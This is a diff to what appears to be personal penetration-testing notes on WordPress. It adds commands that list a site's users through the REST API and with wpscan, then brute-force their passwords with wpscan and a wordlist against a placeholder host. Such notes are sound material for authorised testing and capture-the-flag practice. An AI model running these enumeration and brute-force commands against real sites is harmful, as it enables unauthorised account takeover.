@@ -10,9 +10,23 @@ title: Wordpress 🍔
 
 ![](Pasted%20image%2020240320111450.png)
 
-- Obtain all users of a wordpress by the command: `curl http://whatever.com/index.php/wp-json/wp/v2/users/ | grep name`
-- Now bruteforce the username(s) you found by: `wpscan --url "http://whatever.com/" -U "USERNAME" -P wordlist.txt`
 
+
+## Scan for users
+
+- Obtain all users of a wordpress by the command: `curl http://whatever.com/index.php/wp-json/wp/v2/users/ | grep name`
+
+OR
+
+```shell
+wpscan --url "http://whatever.com" --enumerate u
+```
+
+- Now bruteforce the username(s) you found by: 
+
+```shell
+wpscan --url "http://whatever.com/" -U users.txt -P wordlist.txt
+```
 ## Ignore TLS on https webs
 
 - If you get this error:
